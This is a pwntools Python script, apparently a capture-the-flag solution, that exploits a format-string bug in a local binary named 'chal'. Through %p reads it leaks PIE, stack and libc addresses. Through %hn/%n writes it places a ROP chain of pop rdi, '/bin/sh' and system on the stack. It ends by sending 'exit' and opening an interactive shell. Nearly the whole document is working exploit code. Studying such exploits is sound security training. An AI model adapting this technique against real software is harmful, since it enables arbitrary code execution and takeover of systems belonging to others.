from pwn import *
context.arch  = 'amd64'
# context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
def atk(s):
    ppp = s.ljust(0x100,b'\0')
    p.send(ppp)
    
p = process("./chal")
def calc(a,b):
    if(b>=a):
        return b-a
    else:
        return b+0x10000-a


atk(b"%p")
pie = int(p.readline(),16) -(0x555555556004-0x0000555555554000)
log.warning(hex(pie))

atk(b"%6$p")
stack = int(p.readline(),16)
log.warning(hex(stack))

atk(b"%9$p")
base = int(p.readline(),16) -(0x7ffff7ded0b3-0x7ffff7dc6000)
log.warning(hex(base))

rdi = base+0x00000000000276e9
ret = 0x0000000000025679+base


def x(off,val):
    v1 = val &0xffff
    v2 = (val>>16)&0xffff
    v3 = (val>>32)&0xffff

    vul = 0xdbc8+off
    atk(f'%{vul}c%11$hn'.encode())
    p.readline()
    vul = v1
    atk(f'%{vul}c%39$hn'.encode())
    p.readline()
    
    vul = 0xdbc8+off+2
    atk(f'%{vul}c%11$hn'.encode())
    p.readline()
    vul = v2
    atk(f'%{vul}c%39$hn'.encode())
    p.readline()

    vul = 0xdbc8+off+4
    atk(f'%{vul}c%11$hn'.encode())
    p.readline()
    vul = v3
    atk(f'%{vul}c%39$n'.encode())
    p.readline()

# rdi pop
x(0,rdi)
# /bin/sh 0x7ffff7f7d5aa
sh_str = 0x7ffff7f7d5aa-0x7ffff7dc6000+base
x(8,sh_str)
# system 
system = 0x7ffff7e1b410-0x7ffff7dc6000+base
x(0x18,system)

gdb.attach(p,'''
b *0x55555555526f
b *0x555555555257
''')

atk(b"exit\0")
p.interactive()